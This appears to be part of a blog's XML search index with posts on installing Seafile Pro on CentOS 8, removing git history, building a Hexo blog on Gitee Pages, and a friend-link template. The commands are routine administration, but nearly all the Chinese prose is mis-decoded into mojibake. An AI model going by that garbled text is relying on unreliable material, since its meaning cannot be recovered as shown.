wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo yum clean all //æ¸…é™¤åŸæœ‰yumç¼“å­˜ yum makecache //ç”Ÿæˆæ–°çš„ç¼“å­˜ å®‰è£…å¿…è¦è½¯ä»¶
yum install lrzsz systat tree vim nmap unzip dos2unix nc lsof dnf group install &amp;#34;Development Tools&amp;#34; 2.å‡†å¤‡å·¥ä½œ yum install python3 python3-setuptools python3-pip python3-ldap -y //æ ¹æ®éœ€è¦æ›´æ–°pipæº,ç•¥ ~/.pip/pip.conf ####å‡çº§pipç‰ˆæœ¬ï¼ˆä¸å‡çº§å®‰è£…ä¾èµ–åŒ…å¯èƒ½ä¼šæŠ¥é”™ï¼Œæç¤ºæ–‡ä»¶ç¼ºå¤±ï¼‰ pip3 install --upgrade pip ###å®‰è£…pythonåŒ… pip3 install --timeout=3600 Pillow pylibmc captcha jinja2 sqlalchemy psd-tools django-pylibmc django-simple-captcha ä¸‹è½½ä¸€é”®å®‰è£…seafileè„šæœ¬
wget https://cdn.jsdelivr.net/gh/haiwen/seafile-server-installer-cn@master/seafile-server-7.1-centos-amd64-http proä¸‹è½½åœ°å€ï¼šhttps://download.seafile.com/d/6e5297246c/?p=%2Fpro&amp;amp;mode=list æ”¾ç½®seafile-pro-server_7.._x86-64_CentOS.tar.gzåˆ°/opt è·¯å¾„
3.å¼€å§‹å®‰è£… bash seafile-server-7.1-centos-amd64-http 7.1.8 é€‰æ‹©pro ç­‰å¾…å®‰è£…å®Œæˆ 4.æ³¨æ„äº‹é¡¹ 4.1 ç›®å‰7.1åœ¨è™šæ‹Ÿæœºä¸‹ï¼Œæœç´¢æœåŠ¡åŸºæœ¬ä¼šå†…å­˜æº¢å‡º å®‰è£…å®Œåè¯·æ³¨æ„å…ˆå…³é—­seafileæœåŠ¡
systemctl stop seafile systemctl stop seahub åŠæ—¶ä¿®æ”¹seafevents.confå…³é—­æœç´¢æœåŠ¡ã€‚
4.2 7.1ä»¥ä¸Šofficeé¢„è§ˆéœ€è¦å®‰è£…Libreoffice æ–°ç‰ˆã€‚ è¯¦è§ https://cloud.seafile.com/published/seafile-manual-cn/deploy_pro/office_documents_preview.md#user-content-7.1%20%E4%BB%A5%E5%8F%8A%E4%B9%8B%E5%90%8E%E7%89%88%E6%9C%AC 5.å†…ç½‘ç©¿é€ æœåŠ¡å™¨å»ºç«‹åœ¨å±€åŸŸç½‘å†…ï¼Œä½¿ç”¨å…è´¹çš„Sakura FRPè¿›è¡Œå†…ç½‘ç©¿é€ã€‚ ç½‘å€ï¼šhttps://www.natfrp.com æ³¨å†Œè´¦å·æ ¹æ®è¯´æ˜å»ºç«‹æœåŠ¡ã€‚</content></entry><entry><title>Gitä»“åº“åˆ é™¤æ‰€æœ‰æäº¤å†å²è®°å½•</title><url>/post/2018-06-29_git%E4%BB%93%E5%BA%93%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/</url><categories><category>git</category></categories><tags><tag>git</tag></tags><content type="html">æŠŠæ—§é¡¹ç›®æäº¤åˆ°gitä¸Šï¼Œä½†æ˜¯ä¼šæœ‰ä¸€äº›å†å²è®°å½•ï¼Œè¿™äº›å†å²è®°å½•ä¸­å¯èƒ½ä¼šæœ‰é¡¹ç›®å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ã€‚å¦‚ä½•åˆ é™¤è¿™äº›å†å²è®°å½•ï¼Œå½¢æˆä¸€ä¸ªå…¨æ–°çš„ä»“åº“ï¼Œå¹¶ä¸”ä¿æŒä»£ç ä¸å˜å‘¢ï¼Ÿ
git checkout --orphan latest_branch git add -A git commit -am &amp;#34;commit message&amp;#34; git branch -D main git branch -m main git push -f origin main</content></entry><entry><title>hexoå»ºç«™æ€»ç»“</title><url>/post/2018-06-28_hexo%E5%BB%BA%E7%AB%99%E6%80%BB%E7%BB%93/</url><categories><category>web</category></categories><tags><tag>è‡ªå®šä¹‰</tag><tag>ä¸ªæ€§åŒ–</tag><tag>å¸ƒå±€</tag></tags><content type="html"><![CDATA[å‰è¨€ æœ€è¿‘çªç„¶æƒ³æ•´ç†ä¸‹æŠ€æœ¯çš„æ€è·¯ï¼Œåˆšå¥½çœ‹åˆ°ç äº‘ä¹Ÿæœ‰Gitee Pages æœåŠ¡,æ”¯æŒJekyllã€Hugoã€Hexoã€‚è¯•éªŒäº†ä¸‹å†³å®šé€‰ç”¨hexoæ­å»ºåšå®¢ã€‚
è½¯ä»¶å‡†å¤‡ ä»¥ä¸‹å‡ä¸ºåœ¨windowsç¯å¢ƒä¸‹æ“ä½œï¼Œé¦–å…ˆå…ˆå®‰è£…ä»¥ä¸‹ç¨‹åº
git node.js gitè®¾ç½® $ git config --global user.name &#34;fjcqv&#34; $ git config --global user.email fjcqv@qq.com æœ‰å¿…è¦å¯è®¾ç½®gitä½¿ç”¨sshç§˜é’¥ï¼Œè¿™æ ·å¯ä»¥å…ç™»å½•ã€‚
npmè®¾ç½® //è®¾ç½®npmåº“ä½ç½® npm config set prefix &#34;D:/Program Files/nodejs/npm_global&#34; npm config set cache &#34;D:/Program Files/nodejs/npm_cache&#34; //åœ¨ä¸­å›½ï¼Œä¸­å›½ï¼Œä¸­å›½ï¼Œä½ åº”è¯¥è®¾ç½®æ·˜å®é•œåƒæ¥åŠ é€Ÿä¸‹è½½ã€‚ npm config set registry &#34;https://registry.npm.taobao.org/&#34; npm config set electron_mirror &#34;https://npm.taobao.org/mirrors/electron/&#34; ä½¿ç”¨npmå®‰è£…Hexo npm install hexo-cli -g hexo init blog cd blog npm install hexo server ç„¶åè®¿é—®localhost:4000å°±èƒ½çœ‹åˆ°é›å½¢ã€‚
é€‰æ‹©hexoä¸»é¢˜ è¿™è¾¹æˆ‘ä»¬ä½¿ç”¨nexTä½œä¸ºä¸»é¢˜ã€‚ å…ˆä»https://github.com/theme-next/hexo-theme-next forkåˆ°è‡ªå·±ä»“åº“ã€‚ ç„¶ååœ¨ç«™ç‚¹æ ¹ç›®å½•ç»ˆç«¯è¾“å…¥ //åˆ›å»ºå­æ¨¡å— git submodule add &#34;git@github.com:fjcqv/hexo-theme-next.git&#34; &#34;themes/next&#34; //æˆ–è€…ä»¥ä¸‹å‘½ä»¤ï¼Œä¸ªäººè§‰å¾—ä¸Šé¢çš„å¥½å¤„æ˜¯ä¿®æ”¹ä¸»é¢˜ç»´æŠ¤æ–¹ä¾¿ç‚¹ã€‚ git clone https://github.com/theme-next/hexo-theme-next themes/next æ‰“å¼€ç«™ç‚¹é…ç½®æ–‡ä»¶_config.ymlï¼Œ æ‰¾åˆ° theme å­—æ®µï¼Œå¹¶å°†å…¶å€¼æ›´æ”¹ä¸º nextã€‚ # æ‰©å±• ## æ’ä»¶: https://hexo.io/plugins/ ## ä¸»é¢˜: https://hexo.io/themes/ theme: next é‡æ–°ç”Ÿæˆ hexo clean //æ¸…é™¤ç¼“å­˜ hexo g //é‡æ–°ç”Ÿæˆä»£ç  hexo s //éƒ¨ç½²åˆ°æœ¬åœ° //ç„¶åæ‰“å¼€æµè§ˆå™¨è®¿é—® localhost:4000 æŸ¥çœ‹æ•ˆæœ éƒ¨ç½² é€‰æ‹©éƒ¨ç½²ä»“åº“ æœ¬æ–‡é€‰æ‹©ç äº‘ï¼Œæ¯•ç«Ÿåœ¨å›½å†…ï¼Œè®¿é—®é€Ÿåº¦å¿«ç‚¹ å»ºç«‹ä¸€ä¸ªä¸è‡ªå·±ä¸ªæ€§åœ°å€åŒåçš„é¡¹ç›® é…ç½® æ‰“å¼€ç«™ç‚¹é…ç½®æ–‡ä»¶_config.ymlï¼Œ æ‰¾åˆ° deploy å­—æ®µä¿®æ”¹ã€‚
# éƒ¨ç½² ## Docs: https://hexo.io/docs/deployment.html deploy: type: git repo: git@gitee.com:cqv/cqv.git branch: master message: &#39;ç«™ç‚¹æ›´æ–°:{{now(&#34;YYYY-MM-DD HH:mm:ss&#34;)}}&#39; å®‰è£…æ’ä»¶å¹¶éƒ¨ç½² npm install hexo-deployer-git --save hexo d å¼€å¯pagesæœåŠ¡ ç äº‘éœ€è¦åœ¨é¡¹ç›®é€‰æ‹©gitee pagesæœåŠ¡å°†å…¶å¼€å¯ï¼Œæ‰èƒ½è®¿é—®ã€‚
]]></content></entry><entry><title>ç«™ç‚¹ç¤ºä¾‹</title><url>/flinks.html</url><categories/><tags/><content type="html">å¦‚æƒ³äº¤æ¢æœ¬ç«™å‹æƒ…é“¾æ¥ï¼Œè¯·åœ¨è¯„è®ºåŒºç•™ä¸‹ä½ çš„ç«™ç‚¹ä¿¡æ¯ï¼Œæ ¼å¼å‚è€ƒå¦‚ä¸‹ï¼š
- name: Hugo-NexT desc: Hugo NexT å®˜æ–¹é¢„è§ˆç½‘ç«™ã€‚ avatar: https://hugo-next.eu.org/imgs/hugo_next_avatar.png link: https://hugo-next.eu.org</content></entry></search>